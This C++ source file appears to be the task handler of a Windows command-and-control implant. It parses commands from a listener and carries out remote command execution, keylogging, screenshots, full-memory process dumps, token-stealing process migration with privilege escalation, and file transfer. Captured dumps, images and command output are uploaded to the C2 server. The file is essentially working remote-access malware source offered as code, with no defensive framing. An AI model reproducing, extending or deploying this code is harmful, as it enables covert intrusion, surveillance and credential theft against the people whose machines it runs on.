#include "task.hpp"

std::wstring GetTask(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath
) {
	std::wstring task;
	HINTERNET hRequest = NULL;

	WinHttpResponse resp = SendRequest(
		hConnect,
		lpHost,
		nPort,
		lpPath,
		L"GET",
		NULL,
		NULL,
        0
	);
	if (!resp.bResult || resp.dwStatusCode != 200)
	{
		return task;
	}

	hRequest = resp.hRequest;

	task = ReadResponseText(hRequest);
	return task;
}

std::wstring ExecuteTaskCat(const std::wstring& wFile)
{
    std::vector<char> byteData = ReadBytesFromFile(wFile);

    // Convert to wstring
    std::string fileContent = VecCharToString(byteData);
    std::wstring wFileContent = UTF8Decode(fileContent);

    return wFileContent;
}

std::wstring ExecuteTaskCd(const std::wstring& wDestDir)
{
    if (!SetCurrentDirectoryW(wDestDir.c_str()))
    {
        return L"Error: Could not change current directory.";
    }
    return L"Success: Current directory has been changed.";
}

std::wstring ExecuteTaskCp(const std::wstring& wSrc, const std::wstring& wDest)
{
    if (!CopyFileW(wSrc.c_str(), wDest.c_str(), TRUE))
    {
        return L"Error: Could not copy the file.";
    }
    return L"Success: File has been copied.";
}

std::wstring ExecuteTaskDownload(
    HINTERNET hConnect,
    const std::wstring& wSrc,
    const std::wstring& wDest
) {    
    MyFileData myFileData;
	std::wstring wHeaders;
    WinHttpResponse resp;

    // Read a local file.
    std::vector<char> byteData = ReadBytesFromFile(wSrc);

    // Set additional headers.
    // Specify the destination file path in the server-side.
	wHeaders = L"X-FILE: " + wDest;

	resp = SendRequest(
		hConnect,
		LISTENER_HOST_W,
		LISTENER_PORT,
		REQUEST_PATH_UPLOAD_W,
		L"POST",
		wHeaders.c_str(),
		(LPVOID)byteData.data(),
        (DWORD)byteData.size()
	);
	if (!resp.bResult || resp.dwStatusCode != 200)
	{
		return L"Error: Could not upload a file.";
	}

    return wDest.c_str();
}

std::wstring ExecuteTaskExecute(const std::wstring& cmd)
{
    std::wstring result;

    result = ExecuteCmd(cmd);
    if (wcscmp(result.c_str(), L"") == 0)
    {
        return L"Success: Command have been executed.";
    }
    return result;
}

std::wstring ExecuteTaskIp()
{
    return GetIpAddresses();
}

std::wstring ExecuteTaskKeyLog(const std::wstring& wLogTime)
{
    INT nLogTime = std::stoi(wLogTime);
    return KeyLog(nLogTime);
}

std::wstring ExecuteTaskKill()
{
    ExitProcess(EXIT_SUCCESS);
    return L"Success: Exit the process.";
}

std::wstring ExecuteTaskLs(const std::wstring& wDir)
{
    std::wstring result;

    DWORD dwRet;
    WIN32_FIND_DATAW ffd;
    LARGE_INTEGER filesize;
    std::wstring wFilesize;
    WCHAR wTargetDir[MAX_PATH];
    size_t dirLength;
    WCHAR wBuffer[MAX_PATH];
    WCHAR** lppPart = {NULL};
    HANDLE hFind = INVALID_HANDLE_VALUE;

    StringCchLengthW(wDir.c_str(), MAX_PATH, &dirLength);
    if (dirLength > MAX_PATH)
    {
        return L"Error: Directory path is too long.";
    }

    StringCchCopyW(wTargetDir, MAX_PATH, wDir.c_str());
    StringCchCatW(wTargetDir, MAX_PATH, L"\\*");

    // Find the first file in the directory.
    hFind = FindFirstFile(wTargetDir, &ffd);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        return L"Error: Could not find the first file in the directory.";
    }

    // Get the directory (absolute) path
    dwRet = GetFullPathNameW(
        wTargetDir,
        MAX_PATH,
        wBuffer,
        lppPart
    );
    if (dwRet == 0)
    {
        return L"Error: Could not get current directory.";
    }
    std::wstring wDirPath = std::wstring(wBuffer);
    result += std::wstring(L"Directory: ");
    result += std::wstring(wDirPath);
    result += std::wstring(L"\n\n");
    
    // List all files in the directory
    do
    {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            result += std::wstring(L"<D> ");
            result += std::wstring(ffd.cFileName);
            result += std::wstring(L"\n");
        }
        else
        {
            filesize.LowPart = ffd.nFileSizeLow;
            filesize.HighPart = ffd.nFileSizeHigh;
            wFilesize = std::to_wstring(filesize.QuadPart);

            result += std::wstring(L"<F> ");
            result += std::wstring(ffd.cFileName);
            result += std::wstring(L", ");
            result += wFilesize;
            result += std::wstring(L" bytes\n");
        }
    } while (FindNextFileW(hFind, &ffd) != 0);

    FindClose(hFind);
    return result;
}

std::wstring ExecuteTaskMigrate(const std::wstring& wPid)
{
    // Reference:
    // https://gitbook.seguranca-informatica.pt/privilege-escalation-privesc/process-migration-like-meterpreter

    DWORD dwPid = ConvertWstringToDWORD(wPid, 10);

    BOOL bResult = FALSE;

    // Check if the process has required permissions.
    HANDLE hToken;
    LUID fLuid;
    BOOL bCheckPrivilege = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
    {
        return L"Error: Could not open the process token.";
    }

    const wchar_t* cPrivs[] = {L"SeAssignPrimaryTokenPrivilege", L"SeTcbPrivilege"};

    for (int i = 0; i < 2; i++)
    {
        bCheckPrivilege = CheckPrivilege(hToken, (LPCTSTR)cPrivs[i]);
    }

    if (!bCheckPrivilege)
    {
        // Try to set the necessary privileges.
        HANDLE hCurrentProcessToken;
        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ALL_ACCESS,
            &hCurrentProcessToken
        );
        const wchar_t* privs[9] = {
            L"SeAssignPrimaryTokenPrivilege",
            L"SeTcbPrivilege",
            L"SeCreateGlobalPrivilege",
            L"SeDebugPrivilege",
            L"SeImpersonatePrivilege",
            L"SeIncreaseQuotaPrivilege",
            L"SeProfileSingleProcessPrivilege",
            L"SeSecurityPrivilege",
            L"SeSystemEnvironmentPrivilege"
        };
        for (int i = 0; i < 9; i++)
        {
            if (!SetPrivilege(hCurrentProcessToken, privs[i], TRUE))
            {
                return L"Error: Could not set required privileges to the current process.";
            }
        }
    }

    // Try to migrate to the process.
    Sleep(1000);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    if (!hProcess)
    {
        return L"Error: Could not open the process.";
    }

    HANDLE hNewToken;
    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hNewToken))
    {
        return L"Error: Could open the process token.";
    }
    Sleep(500);

    HANDLE hPrimaryToken;
    if (!DuplicateTokenEx(
        hNewToken,
        MAXIMUM_ALLOWED,
        NULL,
        SecurityImpersonation,
        TokenPrimary,
        &hPrimaryToken
    ))
    {
        // Denied to duplicate process tokens.
    }
    Sleep(1000);

    // Try to execute new process with duplicated tokens.
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    DWORD dwFlag;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.lpDesktop = (LPWSTR)L"WinSta0\\Default";
    ZeroMemory(&pi, sizeof(pi));
    
    std::wstring cmd = L"cmd.exe";
    Sleep(500);
    if (!CreateProcessWithTokenW(
        hPrimaryToken,
        0x00000001,
        NULL,
        (LPWSTR)cmd.c_str(),
        dwFlag,
        NULL,
        NULL,
        &si,
        &pi
    ))
    {
        return L"Error: Could not create a new process with extracted token.";
    }

    return L"Success: Migrated to the specified process.";
}

std::wstring ExecuteTaskMkdir(const std::wstring& wDir)
{
    if (!CreateDirectoryW(wDir.c_str(), NULL))
    {
        return L"Error: Could not create a new directory.";
    }

    return L"Success: New directory has been created.";
}

std::wstring ExecuteTaskMv(
    const std::wstring& wSrc,
    const std::wstring& wDest
) {
    if (!MoveFileW(wSrc.c_str(), wDest.c_str()))
    {
        return L"Error: Could not move a file.";
    }

    return L"Success: File has been moved to the destination.";
}

std::wstring ExecuteTaskNet()
{
    return GetNetTCPConnection();
}

std::wstring ExecuteTaskProcdump(const std::wstring& wPid)
{
    DWORD dwPid = ConvertWstringToDWORD(wPid, 10);
    // std::wstring wDumpFilePath = L"tmp.dmp";
    std::wstring wDumpFilePath = GetEnvStrings(L"%TEMP%") + L"\\tmp.dmp";

    HANDLE hFile = CreateFile(
        wDumpFilePath.c_str(),
        GENERIC_ALL,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return L"Error: Could not create a file to dump.";
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPid);
    if (!hProcess)
    {
        CloseHandle(hFile);
        return L"Error: Could not open process.";
    }

    if (!MiniDumpWriteDump(
        hProcess,
        dwPid,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    )) {
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return L"Error: Could not dump the process.";
    }

    CloseHandle(hFile);
    CloseHandle(hProcess);

    return wDumpFilePath.c_str();
}

std::wstring ExecuteTaskPs()
{
    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;

    DWORD dwCurrentPid = GetCurrentProcessId();

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        return L"Error: Could not create snapshot.";
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    if (!Process32FirstW(hSnapshot, &pe32))
    {
        CloseHandle(hSnapshot);
        return L"Error: Could not get the first process.";
    }

    std::wstring wProcesses = L"";

    do {
        DWORD dwPid = pe32.th32ProcessID;
        std::wstring wPid = ConvertDWORDToWstring(dwPid);
        std::wstring wProcessName(pe32.szExeFile);

        // If the pid is current pid, prepend asterisk (*) to the line.
        std::wstring wPrefix = L" ";
        if (dwPid == dwCurrentPid)
        {
            wPrefix = L"*";
        }

        wProcesses += wPrefix + wPid + L"\t" + wProcessName + L"\n";
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);

    if (wcscmp(wProcesses.c_str(), L"") == 0)
    {
        return L"Error: Processes not found.";
    }

    // Finally, preprend the header in the output.
    std::wstring wHeader = L"PID\tName\n";
    std::wstring wHeaderBar = L"---\t----\n";

    return wHeader + wHeaderBar + wProcesses;
}

std::wstring ExecuteTaskPsKill(const std::wstring& wPid)
{
    DWORD dwPid = ConvertWstringToDWORD(wPid, 10);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    if (!hProcess)
    {
        return L"Error: Could not open the process.";
    }

    if (!TerminateProcess(hProcess, EXIT_SUCCESS))
    {
        CloseHandle(hProcess);
        return L"Error: Could not terminte the process.";
    }

    CloseHandle(hProcess);

    return L"Success: Process has been terminated.";
}

std::wstring ExecuteTaskPwd()
{
    WCHAR wBuffer[MAX_PATH];
    DWORD dwRet;

    dwRet = GetCurrentDirectoryW(MAX_PATH, wBuffer);
    if (dwRet == 0 || dwRet > MAX_PATH)
    {
        return L"Error: Could not get current directory.";
    }
    
    return std::wstring(wBuffer);
}

std::wstring ExecuteTaskRm(const std::wstring& wFile)
{
    if (!DeleteFileW(wFile.c_str()))
    {
        return L"Error: Could not delete a file.";
    }

    return L"Success: File has been deleted.";
}

std::wstring ExecuteTaskRmdir(const std::wstring& wDir)
{
    if (!RemoveDirectoryW(wDir.c_str()))
    {
        return L"Error: Could not delete a directory.";
    }

    return L"Success: Directory has been deleted.";
}

std::wstring ExecuteTaskScreenshot(HINSTANCE hInstance, INT nCmdShow)
{
    return Screenshot(hInstance, nCmdShow);
}

std::wstring ExecuteTaskSleep(
    const std::wstring& wSleepTime,
    INT &nSleep
) {
    INT newSleepTime = std::stoi(wSleepTime);
    nSleep = newSleepTime;
    return L"Success: The sleep time has been updated.";
}

std::wstring ExecuteTaskUpload(
    HINTERNET hConnect,
    const std::wstring& wSrc,
    const std::wstring& wDest
) {
    std::string sSrc = UTF8Encode(wSrc);

    // Download a specified file from the C2 server.
    BOOL bResult = DownloadFile(
	    hConnect,
	    LISTENER_HOST_W,
	    LISTENER_PORT,
	    REQUEST_PATH_DOWNLOAD_W,
        wSrc,
        wDest
    );
    if (!bResult)
    {
        return L"Error: Could not download a file.";
    }

    return wDest.c_str();
}

std::wstring ExecuteTaskWhoami()
{
    std::wstring result;

    WCHAR wInfoBuf[INFO_BUFFER_SIZE] = {'\0'};
    DWORD dwBufCharCount = INFO_BUFFER_SIZE;

    if (!GetComputerNameW(wInfoBuf, &dwBufCharCount))
    {
        return L"Error: Could not get the computer name.";
    }

    result += std::wstring(wInfoBuf);
    dwBufCharCount = INFO_BUFFER_SIZE;
    
    if (!GetUserNameW(wInfoBuf, &dwBufCharCount))
    {
        return L"Error: Could not get the username.";
    }

    result += std::wstring(L"\\");
    result += std::wstring(wInfoBuf);

    return result;
}

std::wstring ExecuteTask(
    HINSTANCE hInstance,
    INT nCmdShow,
    HINTERNET hConnect,
	const std::wstring& task,
	INT &nSleep
) {
	// If no task, return immediatly.
	if (wcscmp(task.substr(0, 4).c_str(), L"cat ") == 0)
	{
		return ExecuteTaskCat(task.substr(4, task.size()));
	}
	else if (wcscmp(task.substr(0, 3).c_str(), L"cd ") == 0)
	{
		return ExecuteTaskCd(task.substr(3, task.size()));
	}
    else if (wcscmp(task.substr(0, 3).c_str(), L"cp ") == 0)
    {
        // Parse arguments.
        std::vector<std::wstring> wArgs = SplitW(task, L' ');
        if (wArgs.size() != 3)
        {
            return L"Error: Invalid argument.";
        }
        std::wstring wSrc = wArgs[1];
        std::wstring wDest = wArgs[2];

        return ExecuteTaskCp(wSrc, wDest);
    }
    else if (wcscmp(task.substr(0, 9).c_str(), L"download ") == 0)
    {
        // Parse arguments.
        std::vector<std::wstring> wArgs = SplitW(task, L' ');
        if (wArgs.size() != 3)
        {
            return L"Error: Invalid argument.";
        }
        std::wstring wSrc = wArgs[1];
        std::wstring wDest = wArgs[2];

        return ExecuteTaskDownload(
            hConnect,
            wSrc,
            wDest
        );
    }
    else if (wcscmp(task.substr(0, 8).c_str(), L"execute ") == 0)
	{
		return ExecuteTaskExecute(task.substr(8, task.size()));
	}
    else if (wcscmp(task.substr(0, 2).c_str(), L"ip") == 0)
    {
        return ExecuteTaskIp();
    }
	else if (wcscmp(task.substr(0, 7).c_str(), L"keylog ") == 0)
	{
		return ExecuteTaskKeyLog(task.substr(7, task.size()));
	}
    else if (wcscmp(task.c_str(), L"kill") == 0)
    {
        return ExecuteTaskKill();
    }
	else if (wcscmp(task.substr(0, 3).c_str(), L"ls ") == 0)
	{
		return ExecuteTaskLs(task.substr(3, task.size()));
	}
    else if (wcscmp(task.substr(0, 8).c_str(), L"migrate ") == 0)
    {
        return ExecuteTaskMigrate(task.substr(8, task.size()));
    }
    else if (wcscmp(task.substr(0, 6).c_str(), L"mkdir ") == 0)
    {
        return ExecuteTaskMkdir(task.substr(6, task.size()));
    }
    else if (wcscmp(task.substr(0, 3).c_str(), L"mv ") == 0)
    {
        // Parse arguments.
        std::vector<std::wstring> wArgs = SplitW(task, L' ');
        if (wArgs.size() != 3)
        {
            return L"Error: Invalid argument.";
        }
        std::wstring wSrc = wArgs[1];
        std::wstring wDest = wArgs[2];

        return ExecuteTaskMv(wSrc, wDest);
    }
    else if (wcscmp(task.c_str(), L"net") == 0)
    {
        return ExecuteTaskNet();
    }
    else if (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0)
    {
        return ExecuteTaskProcdump(task.substr(9, task.size()));
    }
    else if (wcscmp(task.c_str(), L"ps") == 0)
    {
        return ExecuteTaskPs();
    }
    else if (wcscmp(task.substr(0, 8).c_str(), L"ps kill ") == 0)
    {
        return ExecuteTaskPsKill(task.substr(8, task.size()));
    }
	else if (wcscmp(task.c_str(), L"pwd") == 0)
	{
		return ExecuteTaskPwd();
	}
    else if (wcscmp(task.substr(0, 3).c_str(), L"rm ") == 0)
    {
        return ExecuteTaskRm(task.substr(3, task.size()));
    }
    else if (wcscmp(task.substr(0, 6).c_str(), L"rmdir ") == 0)
    {
        return ExecuteTaskRmdir(task.substr(6, task.size()));
    }
	else if (wcscmp(task.c_str(), L"screenshot") == 0)
	{
		return ExecuteTaskScreenshot(hInstance, nCmdShow);
	}
	else if (wcscmp(task.substr(0, 6).c_str(), L"sleep ") == 0)
	{
		return ExecuteTaskSleep(task.substr(6, task.size()), nSleep);
	}
    else if (wcscmp(task.substr(0, 7).c_str(), L"upload ") == 0)
    {
        // Parse arguments.
        std::vector<std::wstring> wArgs = SplitW(task, L' ');
        if (wArgs.size() != 3)
        {
            return L"Error: Invalid argument.";
        }
        std::wstring wSrc = wArgs[1];
        std::wstring wDest = wArgs[2];

        return ExecuteTaskUpload(
            hConnect,
            wSrc,
            wDest
        );
    }
	else if (wcscmp(task.c_str(), L"whoami") == 0)
	{
		return ExecuteTaskWhoami();
	}
	else
	{
		return L"Error: Invalid task.";
	}
}

BOOL SendTaskResult(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath,
	const std::wstring& task,
	const std::wstring& taskResult
) {
    WinHttpResponse resp;

	if (wcscmp(taskResult.c_str(), L"") == 0) {
		return FALSE;
	}

	// Prepare additional headers
	std::wstring wHeaders;
	wHeaders = L"X-Task: " + task + L"\r\n";

    // When the "procdump" and "screenshot" tasks,
    // read bytes of the captured image file and send them.
    if (
        (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0) ||
        (wcscmp(task.c_str(), L"screenshot") == 0)
    ) {
        // Load a captured image file
        std::vector<char> fileData = ReadBytesFromFile(taskResult);

        // Delete the image file
        DeleteFile(taskResult.c_str());

        resp = SendRequest(
            hConnect,
            lpHost,
            nPort,
            lpPath,
            L"POST",
            wHeaders.c_str(),
            (LPVOID)fileData.data(),
            (DWORD)fileData.size()
        );
    }
    else
    {
        // I couln't retrieve the `wstring` length correctly, so use `string` here.
        std::string sTaskResult = UTF8Encode(taskResult);

        resp = SendRequest(
            hConnect,
            lpHost,
            nPort,
            lpPath,
            L"POST",
            wHeaders.c_str(),
            (LPVOID)sTaskResult.c_str(),
            (DWORD)strlen(sTaskResult.c_str())
        );
    }


	if (!resp.bResult || resp.dwStatusCode != 200)
	{
		return FALSE;
	}

	return TRUE;
}